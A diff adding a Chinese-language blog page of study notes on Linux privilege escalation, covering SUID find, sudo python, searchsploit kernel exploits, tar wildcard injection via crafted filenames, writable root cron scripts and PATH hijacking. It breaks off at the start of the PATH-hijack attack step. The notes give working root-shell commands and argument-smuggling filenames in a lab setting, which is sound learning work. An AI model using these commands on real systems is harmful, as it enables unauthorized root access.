@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Zach0ry">
+    
+    <title>
+        
+            Linux提权学习 |
+        
+        Zach0ry&#39;s home
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/123.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/123.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Zach0ry&#39;s home
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Linux提权学习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/av.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Zach0ry</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-07-25 21:35:39</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sat Aug 15 2026 17:22:26 GMT+0800">2026-08-15 17:22:26</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>近期准备车联网比赛，看到linux提权是一个非常重要的得分点，进行了系统的学习，这里记录一下学习成果</p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使<strong>调用者暂时获得该文件拥有者的权限</strong>。为可执行文件 添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。<br>普通可执行文件可能长这样：<code>-rwxr-xr-x root root /usr/bin/find</code></p>
+<p>带 SUID 后可能长这样：<code>-rwsr-xr-x root root /usr/bin/find</code></p>
+<p>这个s就是SUID</p>
+<p>如果一个 SUID root 程序能做这些事，就危险：</p>
+<p>执行系统命令&#x2F;启动 shell&#x2F;写任意文件&#x2F;读取敏感文件</p>
+<p>加载插件&#x2F;脚本&#x2F;调用编辑器&#x2F;调用解释器</p>
+<p>支持 <code>-exec</code>、<code>--command</code>、<code>--script</code> 这类参数</p>
+<p>寻找suid程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>可以去查看find权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l  /usr/bin/find</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>find</code> 是普通权限，这只是普通 shell。<br>但如果 <code>find</code> 是 SUID root，它执行出来的 shell 就可能是 root shell。</p>
+<h3 id="eg-find提权"><a href="#eg-find提权" class="headerlink" title="eg:find提权"></a>eg:find提权</h3><p><strong>伪造</strong></p>
+<p>以find为例，发现普通用户时find没有suid权限，root账户为它赋权</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724102620426.png"
+                        alt="image-20260724102620426"
+                 ></p>
+<p><strong>实操</strong></p>
+<p>看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /system/bin/find</span><br></pre></td></tr></table></figure>
+
+<p>输出：<code>-rwsr-xr-x root root /system/bin/find</code></p>
+<p>说明 <code>find</code> 是 SUID root。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find . -exec /usr/bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find   运行 SUID find</span><br><span class="line">.                  从当前目录开始找</span><br><span class="line">-exec              对找到的结果执行命令</span><br><span class="line">/usr/bin/sh -p  启动 shell，并尽量保留有效 UID</span><br><span class="line">\;                 -exec 的结束标记</span><br><span class="line">-quit              执行一次后退出</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724103342882.png"
+                        alt="image-20260724103342882"
+                 ></p>
+<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p><strong>利用 Linux 中 sudo 权限配置不当，从普通用户提升到 root 权限</strong>的过程。</p>
+<p>简单理解：</p>
+<blockquote>
+<p>sudo 本来是管理员给普通用户“临时使用管理员权限”的机制，如果配置错误，普通用户可能获得完整 root 权限。</p>
+</blockquote>
+<p>查看当前用户的<code>sudo</code>权限</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724144209875.png"
+                        alt="image-20260724144209875"
+                 ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(ALL : ALL) ALL</span><br><span class="line">(运行用户 : 运行组) 可以执行的命令</span><br><span class="line">可以切换成任意用户身份运行:可以使用任意组:可以执行任意命令。</span><br></pre></td></tr></table></figure>
+
+<p>此时允许kali账户通过sudo 以root权限执行所有命令，但是还是要输命令</p>
+<p>我们在正式使用该方法时可重点考虑NOPASSWD的情况</p>
+<h3 id="eg-python可执行权限"><a href="#eg-python可执行权限" class="headerlink" title="eg:python可执行权限"></a>eg:python可执行权限</h3><p><strong>伪造</strong></p>
+<p>可以先创建一个user1用户</p>
+<p>然后打开&#x2F;etc&#x2F;sudoers文件修改其相关执行权限</p>
+<p>加入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user1 ALL=(root) NOPASSWD: /usr/bin/python</span><br><span class="line">用户 user1 可以无需输入密码，以 root 身份运行 /usr/bin/python</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724150433400.png"
+                       
+                 ></p>
+<p>之后切换回user1用户</p>
+<p><strong>执行</strong></p>
+<blockquote>
+<p>需要知道各个用户的sudo权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>该命令有时有时会被特意设计为普通用户可执行</p>
+</blockquote>
+<p>用户 user1 可以无需输入密码，以 root 身份运行 &#x2F;usr&#x2F;bin&#x2F;python</p>
+<p>创建并且写入提权命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724150554230.png"
+                        alt="image-20260724150554230"
+                 ></p>
+<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>普通用户通过一个内核 bug，让内核错误地把自己变成 root</p>
+<p>在 Linux&#x2F;Android 里执行任何操作，都会经过内核：普通用户不能直接改内核内存，但可以通过这些“入口”请求内核做事。</p>
+<p>利用内核漏洞提取一般三个环节：</p>
+<p>首先对目标系统进行信息收集，获取系统内核信息及版本信息</p>
+<p>第二步，根据内核版本获取对应的漏洞以及exp</p>
+<p>第三步，使用exp对目标进行攻击，完成提权</p>
+<p><strong>安装searchsploit</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install exploitdb</span><br></pre></td></tr></table></figure>
+
+<p><strong>查内核版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>eg：<code>Linux target 4.4.0-116-generic x86_64</code></p>
+<p> <strong>更新 exploit 数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo searchsploit -u</span><br></pre></td></tr></table></figure>
+
+<p><strong>搜索漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 4.4.0</span><br></pre></td></tr></table></figure>
+
+<p>查看搜索脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x 45010</span><br></pre></td></tr></table></figure>
+
+<p>确认：影响版本&#x2F;编译方法&#x2F;使用方法</p>
+<p>赋值过拉编译执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 45010</span><br><span class="line">gcc 45010.c -o 45010</span><br><span class="line">根据实际情况去上传</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Cronjobs提权"><a href="#Cronjobs提权" class="headerlink" title="Cronjobs提权"></a>Cronjobs提权</h2><p>如果 root 用户的定时任务会执行一个普通用户可以修改的文件，那么普通用户就可以控制 root 执行的内容，从而获得 root 权限。</p>
+<p><strong>Cron</strong>: Linux 的定时任务服务。(常见位置&#x2F;etc&#x2F;crontab)</p>
+<p>例如：</p>
+<p>每天凌晨备份：0 2 * * * &#x2F;backup.sh</p>
+<p>表示：每天 2 点执行：&#x2F;backup.sh</p>
+<p>查看定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724164408090.png"
+                        alt="image-20260724164408090"
+                 ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"> 分  时 日  月 周    用户     要执行的命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br></pre></td></tr></table></figure>
+
+<p>每小时第17分钟，root进入 <code>/</code>，然后执行 <code>/etc/cron.hourly</code> 目录里面所有脚本。</p>
+<h3 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h3><p>root 的定时任务执行了带 <code>*</code> 通配符的命令，而普通用户可以控制 <code>*</code> 展开的文件名，<strong>从而让文件名变成 tar 参数。</strong></p>
+<p><strong>伪造</strong></p>
+<p>以root用户执行下面的命令创建目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/backup</span><br></pre></td></tr></table></figure>
+
+<p>给普通用户写权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /tmp/backup</span><br></pre></td></tr></table></figure>
+
+<p>让所有用户 可以创建&#x2F;删除文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724173339488.png"
+                        alt="image-20260724173339488"
+                 ></p>
+<p><strong>创建 root 执行的备份脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /tmp/tar_backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /tmp/backup</span><br><span class="line">tar -czf /tmp/backup.tar.gz *</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>*</code> 会被 Shell 展开成目录中的文件名</p>
+</blockquote>
+<p>赋予执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/tar_backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>编辑 root 的 crontab：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /tmp/tar_backup.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/backup</span><br><span class="line">touch -- &quot;--checkpoint=1&quot;#会把文件名当作tar的参数#每处理一个文件触发一次checkpoint</span><br><span class="line">touch -- &quot;--checkpoint-action=exec=sh shell.sh&quot;#checkpoint 触发的时候执行shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>创建执行脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">chmod u+s /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>并且赋予执行权限<code>chmod +x shell.sh</code></p>
+<blockquote>
+<p>此时实际执行的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;tar -czf /tmp/backup.tar.gz \ </span><br><span class="line">&gt;--checkpoint=1 \ </span><br><span class="line">&gt;--checkpoint-action=exec=sh shell.sh \ </span><br><span class="line">&gt;shell.sh</span><br></pre></td></tr></table></figure></blockquote>
+<p>之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
+
+<p>就看到了提权成功</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724174903193.png"
+                        alt="image-20260724174903193"
+                 ></p>
+<h3 id="Crontab-文件覆盖提权"><a href="#Crontab-文件覆盖提权" class="headerlink" title="Crontab 文件覆盖提权"></a>Crontab 文件覆盖提权</h3><p>条件1：存在root执行的cron</p>
+<p>条件2：普通用户可以修改这个脚本</p>
+<p>条件3：cron执行的是脚本，而不是固定二进制</p>
+<p><strong>伪造</strong></p>
+<p>先用 root 权限创建：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /tmp/backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">echo &quot;backup running&quot;</span><br></pre></td></tr></table></figure>
+
+<p>让用户可写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 /tmp/backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /tmp/backup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724171453926.png"
+                        alt="image-20260724171453926"
+                 ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rwxrwxrwx</span><br><span class="line">   ↑</span><br><span class="line">普通用户可写</span><br></pre></td></tr></table></figure>
+
+<p>在定时任务中写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root /tmp/backup.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">ls -l /tmp/backup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724171935616.png"
+                        alt="image-20260724171935616"
+                 ></p>
+<p>看到漏洞文件存在，利用漏洞</p>
+<p>把&#x2F;tmp&#x2F;backup.sh文件内容替换为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">chmod u+s /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>因为&#x2F;tmp&#x2F;backup.sh是一分钟执行一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 1 ls -l /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724172201530.png"
+                        alt="image-20260724172201530"
+                 ></p>
+<p>看到s就代表他已经有了suid权限</p>
+<p>进行suid攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260724172307724.png"
+                        alt="image-20260724172307724"
+                 ></p>
+<h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><p>PATH是Linux和类Unix操作系统中的环境变量 ，它指定可执行程序的所有bin和sbin存储目录。当用户在终端上运行任何命令时，它会向shell发送请求以在PATH变量中搜索可执行文件来响应用户执行的命令。</p>
+<p>在现代 Linux 系统中，<code>/bin/bash</code> 和 <code>/bin/dash</code> 包含一种自我保护机制。当 shell 启动时，它会对比当前进程的两个关键标识：</p>
+<p><strong>RUID (Real UID)</strong>：实际执行该程序的用户的 UID（例如普通用户是 1000）。</p>
+<p><strong>EUID (Effective UID)</strong>：进程当前生效的权限 UID（如果是 SUID root 程序，此处为 0）。</p>
+<p><strong>安全判定</strong>：如果 bash 发现 <code>RUID != EUID</code>，它会判定这是一种潜在的权限滥用，并<strong>自动将 EUID 降级回 RUID</strong>。这意味着你拿到的是一个普通用户 shell，而不是 root shell</p>
+<h3 id="suid文件调用"><a href="#suid文件调用" class="headerlink" title="suid文件调用"></a>suid文件调用</h3><p><strong>伪造环境</strong></p>
+<p>管理员创建demo.c文件</p>
+<p>执行查看shadow 文件命令，setuid 规定了其运行用户，以root权限进行编译和权限设置：</p>
+<blockquote>
+<p>存在漏洞的 SUID 二进制文件源码里通常有一句 <code>setuid(0);</code>如果 SUID 程序主动调用了 <code>setuid(0)</code>，它的 RUID 就变成了 0，后续依靠 PATH 劫持调用的 <code>bash</code> 发现 RUID(0) &#x3D;&#x3D; EUID(0)，就不会触发降权。</p>
+</blockquote>
+<p>文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt; // 提供 system() 函数的声明</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    // cat代码使用了相对命令 cat，而不是绝对路径 /bin/cat。这就导致程序在运行时，必须依赖当前的 PATH 环境变量去寻找 cat 到底在哪里。</span><br><span class="line">    system(&quot;cat /etc/shadow&quot;); </span><br><span class="line">    </span><br><span class="line">    return 0; // 返回0表示正常退出</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后编译并且赋suid权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o demo</span><br><span class="line">chmod u+s demo</span><br></pre></td></tr></table></figure>
+
+<p>执行demo文件即执行cat &#x2F;etc&#x2F;shadow命令</p>
+<p><strong>攻击</strong></p>
+<p>找到有suid权限的文件</p>
